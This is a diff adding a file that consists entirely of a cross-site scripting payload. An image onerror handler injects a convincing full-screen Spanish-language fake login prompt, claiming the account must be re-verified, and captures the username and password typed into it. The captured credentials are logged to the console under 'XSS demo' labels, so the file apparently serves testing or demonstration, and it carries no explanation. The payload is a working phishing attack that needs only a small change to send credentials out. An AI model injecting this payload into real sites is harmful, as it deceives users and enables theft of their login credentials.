@@ -1,0 +1,45 @@
+<img src=x onerror="!function(){try{
+  var d=document, wrap=d.createElement('div');
+  wrap.id='xph';
+  // Estilos del overlay
+  var ws=wrap.style;
+  ws.position='fixed'; ws.inset='0';
+  ws.background='rgba(0,0,0,.55)';
+  ws.backdropFilter='blur(2px)';
+  ws.zIndex='2147483647';
+  ws.display='flex'; ws.alignItems='center'; ws.justifyContent='center';
+  ws.pointerEvents='auto';
+
+  // Tarjeta
+  var card=d.createElement('div'), cs=card.style;
+  cs.background='#fff'; cs.color='#111'; cs.width='320px';
+  cs.borderRadius='12px'; cs.padding='16px 14px';
+  cs.font='14px system-ui'; cs.boxShadow='0 10px 28px rgba(0,0,0,.35)';
+  card.innerHTML='\
+    <h3 style=&quot;margin:0 0 8px;font-size:18px&quot;>Vuelve a iniciar sesión</h3>\
+    <p>Por seguridad necesitamos verificar tu cuenta.</p>\
+    <label style=&quot;display:block;font-size:12px;margin:.5rem 0 .25rem;color:#555&quot;>Usuario o email</label>\
+    <input id=xu style=&quot;width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:8px&quot;>\
+    <label style=&quot;display:block;font-size:12px;margin:.5rem 0 .25rem;color:#555&quot;>Contraseña</label>\
+    <input id=xp type=password style=&quot;width:100%;padding:8px 10px;border:1px solid #ddd;border-radius:8px&quot;>\
+    <div style=&quot;display:flex;gap:8px;margin-top:12px&quot;>\
+      <button id=xCancel type=button style=&quot;flex:1;padding:8px 10px;border-radius:8px;border:0;background:#eee;color:#111&quot;>Cancelar</button>\
+      <button id=xOk type=button style=&quot;flex:1;padding:8px 10px;border-radius:8px;border:0;background:#111;color:#fff&quot;>Iniciar sesión</button>\
+    </div>';
+
+  wrap.appendChild(card); d.body.appendChild(wrap);
+
+  // Helpers apuntando SIEMPRE dentro del modal
+  var q=function(sel){ return wrap.querySelector(sel); };
+
+  q('#xCancel').onclick=function(ev){ ev.preventDefault(); wrap.remove(); };
+
+  q('#xOk').onclick=function(ev){
+    ev.preventDefault();
+    var data={ user:(q('#xu')&&q('#xu').value)||'', pass:(q('#xp')&&q('#xp').value)||'' };
+    console.log('[XSS demo] Fake login JSON:', data);
+    console.log(JSON.stringify(data));
+    // alert('Credenciales capturadas (demo):\\n'+JSON.stringify(data,null,2));
+    wrap.remove();
+  };
+}catch(e){ console.log('XSS demo error', e); alert('error: '+e.message); }}()">
